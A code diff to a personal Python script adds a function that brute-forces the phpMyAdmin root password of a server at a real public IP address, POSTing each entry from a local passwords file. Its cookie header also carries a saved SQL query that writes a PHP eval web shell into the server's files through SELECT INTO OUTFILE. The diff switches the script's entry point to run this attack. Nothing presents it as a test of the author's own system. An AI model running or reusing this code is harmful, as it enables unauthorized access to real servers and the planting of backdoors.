@@ -133,14 +133,41 @@ def send_push():
 # send_push()
 
 
+def pma_test():
+    for line in open('/Users/zhouzhipeng/Documents/important/passwords.txt','r'):
+        if line.strip():
+
+            try:
+                content='pma_username=root&pma_password=%s&server=1&target=index.php&token=a403496d5e3e24a5384f3e8cb1dd697c' % line.strip()
+                resp=http_retry('http://115.28.175.70/phpmyadmin/index.php',body=content, method='POST',headers={'Cookie':"pmaCookieVer=4; pma_lang=zh_CN; pma_collation_connection=utf8_unicode_ci; phpMyAdmin=m4fotdu7ou0oenpuob07n1l4d04pcu3s; pma_iv-1=OXrK05wxHmkFHuSl6ZlYmw%3D%3D; pmaUser-1=AItf1Gch9O2nFvZxLVOlgA%3D%3D; pma_console_height=92; auto_saved_sql=use%20test%3B%0ADrop%20TABLE%20IF%20EXISTS%20a%3B%0A%0ACreate%20TABLE%20a%20(cmd%20text%20NOT%20NULL)%3B%0AInsert%20INTO%20a%20(cmd)%20VALUES('%3C%3Fphp%20eval(%24_POST%5B1%5D)%3B%3F%3E')%3B%0Aselect%20cmd%20from%20a%20into%20outfile%20'D%3A%2FphpMyAdmin%2Flibraries%2Fd.php'%3B%0ADrop%20TABLE%20IF%20EXISTS%20a%3B%0A%0A; pma_console_config=%7B%22alwaysExpand%22%3Afalse%2C%22startHistory%22%3Afalse%2C%22currentQuery%22%3Atrue%2C%22enterExecutes%22%3Afalse%2C%22darkTheme%22%3Afalse%7D; pma_console_mode=show; PHPSESSID=5plt75se02vp49g614p7h93f41",'Content-Type':'application/x-www-form-urlencoded'})
+                # print(resp)
+
+                if resp and '无法登录 MySQL 服务器' not in resp:
+                    #retry
+                    print(line)
+                    break
+            except Exception:
+                print(line.strip())
+                print('error')
+                break
+
+            time.sleep(0.3)
+
+
+
+
+
+
 if __name__ == '__main__':
-    # filepath=sys.argv[1]
-    filepath='/Users/zhouzhipeng/code/company_projects/20160420-newcouponservice/beauty-campaign-web'
-    filepath+='/.git/config'
-    content=open(filepath).read()
-    result=re.search('url = git@code\.dianpingoa\.com:([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)\.git',content)
-    if result:
-        group_name=result.group(1)
-        project_name=result.group(2)
+    # # filepath=sys.argv[1]
+    # filepath='/Users/zhouzhipeng/code/company_projects/20160420-newcouponservice/beauty-campaign-web'
+    # filepath+='/.git/config'
+    # content=open(filepath).read()
+    # result=re.search('url = git@code\.dianpingoa\.com:([a-zA-Z0-9-]+)/([a-zA-Z0-9-]+)\.git',content)
+    # if result:
+    #     group_name=result.group(1)
+    #     project_name=result.group(2)
+
+    pma_test()
 
     #open_url(sys.argv[1])
